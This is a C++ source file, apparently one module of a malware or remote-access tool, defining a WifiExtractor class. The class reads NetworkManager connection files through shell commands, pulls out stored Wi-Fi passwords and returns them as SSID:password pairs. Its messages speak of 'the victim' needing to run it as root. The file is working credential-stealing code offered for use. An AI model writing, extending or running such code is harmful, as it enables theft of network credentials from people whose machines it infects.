#include "helpers.hpp"
#include "strings.hpp"

#ifdef __linux__
#include <unistd.h>
#endif

class WifiExtractor{
	int totalSSIDs = 0;
	int totalCreds = 0;
	std::string *creds = NULL; // This will contain the SSID:Password pair.
	std::string *ssids = NULL;
	const std::string path = "\"/etc/NetworkManager/system-connections/";

	void setSSIDs(){
	    std::string data = Helpers::executeCommand(("ls " + path + "\"").c_str());
	    tie(totalSSIDs, ssids) = Strings::split(data, '\n');
	    for(int i = 0; i < totalSSIDs; i++)
	    	ssids[i] = Helpers::removeNewline(ssids[i].c_str());
	}
	void extractPasswords(){
		setSSIDs();
	    creds = new std::string[totalSSIDs];
	    for(int i=0; i < totalSSIDs; i++){
	        std::string cmd = "(cat " + path + ssids[i] + "\" | grep psk= | cut -d '=' -f 2)";
	        std::string data = Helpers::executeCommand(cmd.c_str());
	        if(data != "")
	            creds[totalCreds++] = ssids[i] + ":" + data;
	    }
	}
public:
	std::string getCreds(){
		if(!Helpers::isRoot())
			return "[!] Cannot fetch Wi-Fi passwords as the victim isn't running executable as root";
		extractPasswords();
		std::string ret;
		if(!totalCreds)
			return "[!] No Stored Wi-Fi passwords found!";
		for(int i=0; i < totalCreds; i++){
			if(creds[i].find("cat:") == std::string::npos)
				ret += creds[i];
		}
		return ret;
	}
	~WifiExtractor(){
		delete creds;
		delete ssids;
	}
};